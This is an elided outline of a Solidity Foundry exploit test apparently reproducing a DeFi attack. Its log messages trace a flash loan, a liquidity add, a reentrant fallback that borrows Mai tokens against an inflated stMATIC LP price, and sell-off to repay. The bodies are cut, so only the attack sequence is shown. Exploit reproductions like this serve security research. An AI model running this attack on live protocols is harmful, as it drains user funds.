...
contract MarketExploitTest is Test {
    ...
    function _balancerFlashLoan() internal {
        ...
        console.log("attacker get flash loan  WAMatic: 34580036,Stmatic:19663260");
    ...
    function _exploit() internal {
        ...
        console.log("attacker add liquidity to the pool: Stmatic: 19644260, WMatic: 49999999");
        ...
        console.log(" attackrs gets LP token: 34_640_026.55 stMATIC_f");
        ...
        console.log("attacker removes liquidity");
    ...
    receive() external payable {
        ...
        console.log("attacker fallback function called-lets borrow Mai token with higher price stmatic_f");
    ...
    function _sellAll() internal {
        ...
        console.log("attacker sells all tokens to repay flashloan");
